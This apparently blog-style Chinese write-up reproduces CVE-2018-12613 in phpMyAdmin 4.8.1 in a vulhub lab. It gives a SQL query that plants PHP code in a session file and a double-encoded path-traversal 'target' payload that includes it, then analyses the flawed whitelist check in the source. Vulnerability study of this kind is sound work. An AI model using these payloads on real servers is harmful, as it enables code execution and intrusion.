<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<title>CVE-2018-12613 phpMyadmin后台文件包含</title>
</head>
<body><h1 id='cve-2018-12613-phpmyadmin后台文件包含-复现'>CVE-2018-12613 phpMyAdmin后台文件包含 复现</h1>
<h2 id='环境准备'>环境准备</h2>
<blockquote><p><strong>Description</strong></p>
<p>An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the &quot;$cfg[&#39;AllowArbitraryServer&#39;] = true&quot; case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the &quot;$cfg[&#39;ServerDefault&#39;] = 0&quot; case (which bypasses the login requirement and runs the vulnerable code without any authentication).</p>
</blockquote>
<p>目前官方在漏洞范围内的有以下版本</p>
<figure><table>
<thead>
<tr><th><a href='https://www.phpmyadmin.net/files/4.8.1/'>4.8.1</a></th><th>2018-05-25</th><th><a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip'>phpMyAdmin-4.8.1-all-languages.zip</a></th><th>10.1 MB</th><th>[<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip.asc'>PGP</a>] [<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip.sha256'>SHA256</a>]</th></tr></thead>
<tbody><tr><td><a href='https://www.phpmyadmin.net/files/4.8.0.1/'>4.8.0.1</a></td><td>2018-04-19</td><td><a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0.1/phpMyAdmin-4.8.0.1-all-languages.zip'>phpMyAdmin-4.8.0.1-all-languages.zip</a></td><td>10.1 MB</td><td>[<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0.1/phpMyAdmin-4.8.0.1-all-languages.zip.asc'>PGP</a>] [<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0.1/phpMyAdmin-4.8.0.1-all-languages.zip.sha256'>SHA256</a>]</td></tr><tr><td><a href='https://www.phpmyadmin.net/files/4.8.0/'>4.8.0</a></td><td>2018-04-07</td><td><a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0/phpMyAdmin-4.8.0-all-languages.zip'>phpMyAdmin-4.8.0-all-languages.zip</a></td><td>10.1 MB</td><td>[<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0/phpMyAdmin-4.8.0-all-languages.zip.asc'>PGP</a>] [<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0/phpMyAdmin-4.8.0-all-languages.zip.sha256'>SHA256</a>]</td></tr><tr><td><a href='https://www.phpmyadmin.net/files/4.8.0-rc1/'>4.8.0-rc1</a></td><td>2018-03-27</td><td><a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-rc1/phpMyAdmin-4.8.0-rc1-all-languages.zip'>phpMyAdmin-4.8.0-rc1-all-languages.zip</a></td><td>10.1 MB</td><td>[<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-rc1/phpMyAdmin-4.8.0-rc1-all-languages.zip.asc'>PGP</a>] [<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-rc1/phpMyAdmin-4.8.0-rc1-all-languages.zip.sha256'>SHA256</a>]</td></tr><tr><td><a href='https://www.phpmyadmin.net/files/4.8.0-alpha1/'>4.8.0-alpha1</a></td><td>2018-02-27</td><td><a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-alpha1/phpMyAdmin-4.8.0-alpha1-all-languages.zip'>phpMyAdmin-4.8.0-alpha1-all-languages.zip</a></td><td>10.1 MB</td><td>[<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-alpha1/phpMyAdmin-4.8.0-alpha1-all-languages.zip.asc'>PGP</a>] [<a href='https://files.phpmyadmin.net/phpMyAdmin/4.8.0-alpha1/phpMyAdmin-4.8.0-alpha1-all-languages.zip.sha256'>SHA256</a>]</td></tr></tbody>
</table></figure>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2 id='漏洞复现'>漏洞复现</h2>
<p>本次漏洞在<code>vulhub</code>环境下复现，版本是<code>4.8.1</code></p>
<h3 id='写入文件'>写入文件</h3>
<p>在数据库查询</p>
<pre><code class='language-sql' lang='sql'>select &#39;&lt;?php phpinfo();?&gt;&#39;
</code></pre>
<p>然后就会将本次查询写入一个<code>session</code>文件里</p>
<p>文件的位置在<code>/tmp</code>下，名字是<code>sess_20b3a71f70b1cb0cd5a34fb7d7b4cf37</code>，<code>sess_</code>后面那一串是当前的<code>cookie</code>中<code>phpmyadmin</code></p>
<pre><code class='language-url' lang='url'>?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_20b3a71f70b1cb0cd5a34fb7d7b4cf37
</code></pre>
<p>&nbsp;</p>
<h3 id='文件包含'>文件包含</h3>
<pre><code>http://localhost/phpMyAdmin/index.php?target=db_sql.php%253f/../../phpinfo.php
</code></pre>
<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20210309122135.png" referrerpolicy="no-referrer" alt="image-20210309122127867"></p>
<p>可以看到把刚刚写入的<code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code>当成<code>php</code>执行了，那么理论上就可以利用这个去getshell了</p>
<h2 id='源代码分析'>源代码分析</h2>
<pre><code class='language-php' lang='php'>//line45-63
/*
 * Black list of all scripts to which front-end must submit data.
 * Such scripts must not be loaded on home page.
 *
 */
$target_blacklist = array (
    &#39;import.php&#39;, &#39;export.php&#39;
);

// If we have a valid target, let&#39;s load that script instead
if (! empty($_REQUEST[&#39;target&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
) {// 只要进入到这里就有可能存在文件包含漏洞了
    include $_REQUEST[&#39;target&#39;];
    exit;
}
</code></pre>
<p>&nbsp;</p>
<pre><code class='language-php' lang='php'>//line432-476
/**
     * boolean phpMyAdmin.Core::checkPageValidity(string &amp;$page, array $whitelist)
     *
     * checks given $page against given $whitelist and returns true if valid
     * it optionally ignores query parameters in $page (script.php?ignored)
     *
     * @param string &amp;$page     page to check
     * @param array  $whitelist	whitelist to check page against
     *
     * @return boolean whether $page is valid or not (in $whitelist or not)
     */
    public static function checkPageValidity(&amp;$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);// *****************************
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
</code></pre>
<p>&nbsp;</p>
<pre><code class='language-php' lang='php'>//line27-80
/**
     * the whitelist for goto parameter
     * @static array $goto_whitelist
     */
    public static $goto_whitelist = array(
        &#39;db_datadict.php&#39;,
        &#39;db_sql.php&#39;,
        &#39;db_events.php&#39;,
        &#39;db_export.php&#39;,
        &#39;db_importdocsql.php&#39;,
        &#39;db_multi_table_query.php&#39;,
        &#39;db_structure.php&#39;,
        &#39;db_import.php&#39;,
        &#39;db_operations.php&#39;,
        &#39;db_search.php&#39;,
        &#39;db_routines.php&#39;,
        &#39;export.php&#39;,
        &#39;import.php&#39;,
        &#39;index.php&#39;,
        &#39;pdf_pages.php&#39;,
        &#39;pdf_schema.php&#39;,
        &#39;server_binlog.php&#39;,
        &#39;server_collations.php&#39;,
        &#39;server_databases.php&#39;,
        &#39;server_engines.php&#39;,
        &#39;server_export.php&#39;,
        &#39;server_import.php&#39;,
        &#39;server_privileges.php&#39;,
        &#39;server_sql.php&#39;,
        &#39;server_status.php&#39;,
        &#39;server_status_advisor.php&#39;,
        &#39;server_status_monitor.php&#39;,
        &#39;server_status_queries.php&#39;,
        &#39;server_status_variables.php&#39;,
        &#39;server_variables.php&#39;,
        &#39;sql.php&#39;,
        &#39;tbl_addfield.php&#39;,
        &#39;tbl_change.php&#39;,
        &#39;tbl_create.php&#39;,
        &#39;tbl_import.php&#39;,
        &#39;tbl_indexes.php&#39;,
        &#39;tbl_sql.php&#39;,
        &#39;tbl_export.php&#39;,
        &#39;tbl_operations.php&#39;,
        &#39;tbl_structure.php&#39;,
        &#39;tbl_relation.php&#39;,
        &#39;tbl_replace.php&#39;,
        &#39;tbl_row_action.php&#39;,
        &#39;tbl_select.php&#39;,
        &#39;tbl_zoom_select.php&#39;,
        &#39;transformation_overview.php&#39;,
        &#39;transformation_wrapper.php&#39;,
        &#39;user_password.php&#39;,
    );
</code></pre>
<p>&nbsp;</p>
<p>参考链接：</p>

<p>&nbsp;</p>
</body>
</html>